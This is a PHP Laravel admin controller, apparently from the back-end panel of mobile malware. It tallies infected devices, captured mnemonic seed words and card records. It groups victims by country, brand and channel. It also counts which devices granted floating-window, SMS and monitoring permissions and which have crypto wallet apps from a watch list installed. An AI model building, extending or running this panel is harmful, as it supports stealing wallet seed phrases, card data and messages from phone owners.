<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Device;
use App\Models\Monitor;
use App\Models\ReceiveCards;
use App\Models\ReceiveWords;
use App\Service\CountryService;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;

class HomeController extends Controller
{
    /**
     * 首页数据统计
     *
     * @return \Illuminate\Http\JsonResponse|object
     */
    public function statistics()
    {
        $today = Carbon::today();
        $yesterday = Carbon::yesterday();

        $data = [
            'device' => $this->buildStatistic(Device::class, $today, $yesterday),
            'words' => $this->buildStatistic(ReceiveWords::class, $today, $yesterday),
            'cards' => $this->buildStatistic(ReceiveCards::class, $today, $yesterday),
            'permission_stats' => $this->buildPermissionStatistics(),
            'user_profile' => $this->buildUserProfile(),
            'device_groups' => [
                'region' => $this->buildDeviceGroupStatistic('country',100),
                'model' => $this->buildDeviceGroupStatistic('brand',100),
                'system' => $this->buildDeviceGroupStatistic('sdk_version',100),
                'channel' => $this->buildDeviceGroupStatistic('app_channel',100),
            ],
        ];

        return $this->success($data);
    }

    /**
     * 统计总数、昨日新增、今日新增
     *
     * @param string     $modelClass
     * @param Carbon     $today
     * @param Carbon     $yesterday
     * @return array<string,int>
     */
    private function buildStatistic(string $modelClass, Carbon $today, Carbon $yesterday): array
    {
        $query = $modelClass::query();

        $todayAdd = (clone $query)
            ->whereDate('created_at', '=', $today)
            ->count();

        $yesterdayAdd = (clone $query)
            ->whereDate('created_at', '=', $yesterday)
            ->count();

        return [
            'total' => (clone $query)->count(),
            'yesterday_add' => $yesterdayAdd,
            'today_add' => $todayAdd,
        ];
    }

    /**
     * 设备分组统计（默认前10）
     *
     * @param string $field
     * @param int    $limit
     * @return array<int,array<string,mixed>>
     */
    private function buildDeviceGroupStatistic(string $field, int $limit = 10): array
    {
        $result = Device::query()
            ->select([
                DB::raw(sprintf("IFNULL(NULLIF(%s, ''), '未知') as name", $field)),
                DB::raw('COUNT(*) as value'),
            ])
            ->groupBy('name')
            ->orderByDesc('value')
            ->limit($limit)
            ->get()
            ->toArray();

        // 如果是国家字段，将 ISO 代码转换为中文名称
        if ($field === 'country') {
            foreach ($result as &$item) {
                $item['name'] = CountryService::getCountryName($item['name']);
            }
            unset($item);
        }

        return $result;
    }

    /**
     * 授权统计
     * 完整授权：三个权限都有（float_window_permission=1 AND sms_permission=1 AND monitor_permission=1）
     * 基本授权：float_window_permission=1 AND monitor_permission=1（sms_permission可以是0或1）
     * 不授权：其他情况
     *
     * @return array<string,int>
     */
    private function buildPermissionStatistics(): array
    {
        // 完整授权：三个权限都有
        $fullAuth = Device::query()
            ->where('float_window_permission', 1)
            ->where('sms_permission', 1)
            ->where('monitor_permission', 1)
            ->count();

        // 基本授权：float_window_permission=1 AND monitor_permission=1（但不满足完整授权）
        $basicAuth = Device::query()
            ->where('float_window_permission', 1)
            ->where('monitor_permission', 1)
            ->where(function ($query) {
                $query->where('sms_permission', 0)
                    ->orWhereNull('sms_permission');
            })
            ->count();

        // 总设备数
        $total = Device::query()->count();

        // 不授权：总数减去完整授权和基本授权
        $noAuth = $total - $fullAuth - $basicAuth;

        return [
            'full_auth' => $fullAuth,
            'basic_auth' => $basicAuth,
            'no_auth' => $noAuth,
        ];
    }

    /**
     * 用户画像统计
     * 有钱包应用：设备应用列表（receive_apps）中包含任意一款监听列表（monitors）中type=1（助记词）且is_enabled=1的应用包名
     * 有钱包且授权设备：有钱包应用且至少完成基本授权（float_window_permission=1 AND monitor_permission=1）的设备数
     * 无钱包应用：总设备数减去有钱包应用的设备数
     *
     * @return array<string,int>
     */
    private function buildUserProfile(): array
    {
        // 获取所有启用的助记词应用包名列表
        $walletAppPackages = Monitor::query()
            ->where('type', Monitor::TYPE_MNEMONIC)
            ->where('is_enabled', Monitor::STATUS_ENABLED)
            ->pluck('app_package')
            ->toArray();

        // 如果没有配置助记词应用，则有钱包应用为0
        if (empty($walletAppPackages)) {
            $total = Device::query()->count();
            return [
                'has_wallet_app' => 0,
                'has_wallet_app_and_basic_auth' => 0,
                'no_wallet_app' => $total,
            ];
        }

        // 有钱包应用的设备数：设备应用列表中包含任意一款助记词应用包名
        $hasWalletApp = Device::query()
            ->whereHas('receiveApps', function ($query) use ($walletAppPackages) {
                $query->whereIn('app_package', $walletAppPackages);
            })
            ->distinct()
            ->count('id');

        // 有钱包且授权设备：有钱包应用且至少完成基本授权（float_window_permission=1 AND monitor_permission=1）
        $hasWalletAppAndBasicAuth = Device::query()
            ->whereHas('receiveApps', function ($query) use ($walletAppPackages) {
                $query->whereIn('app_package', $walletAppPackages);
            })
            ->where('float_window_permission', 1)
            ->where('monitor_permission', 1)
            ->distinct()
            ->count('id');

        // 总设备数
        $total = Device::query()->count();

        // 无钱包应用：总数减去有钱包应用的设备数
        $noWalletApp = $total - $hasWalletApp;

        return [
            'has_wallet_app' => $hasWalletApp - $hasWalletAppAndBasicAuth,
            'has_wallet_app_and_basic_auth' => $hasWalletAppAndBasicAuth,
            'no_wallet_app' => $noWalletApp,
        ];
    }
}


